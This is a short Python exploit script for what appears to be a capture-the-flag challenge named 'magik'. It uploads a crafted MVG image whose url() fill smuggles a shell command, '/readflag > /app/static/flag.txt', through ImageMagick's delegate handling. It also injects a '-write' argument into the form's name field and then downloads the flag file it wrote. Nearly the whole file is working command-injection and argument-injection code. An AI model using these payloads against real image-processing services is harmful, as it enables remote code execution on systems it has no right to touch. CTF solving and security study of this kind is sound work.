import requests
from textwrap import dedent

url = 'https://aa1fadfd635d-magik.challs.m0lecon.it'

mvg_payload = dedent('''
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|/readflag > /app/static/flag.txt|")'
stroke none
rectangle 0,0 640,480
pop graphic-context
''')

files = {'img': ('exploit.mvg', mvg_payload, 'image/x-mvg')}
# converts final output to static/result.png but writes flag to /app/static/flag.png
name = 'dummy -write /app/static/flag.txt result'
data = {'name': name}

resp = requests.post(url, files=files, data=data, timeout=10)
print('[+] upload status', resp.status_code)
print(resp.text[:200])

flag_resp = requests.get(f"{url}/static/flag.txt", timeout=10)
print('[+] flag fetch', flag_resp.status_code)
if flag_resp.status_code == 200:
    open('flag.png', 'wb').write(flag_resp.content)
    print(flag_resp.text)
else:
    print(flag_resp.text[:200])
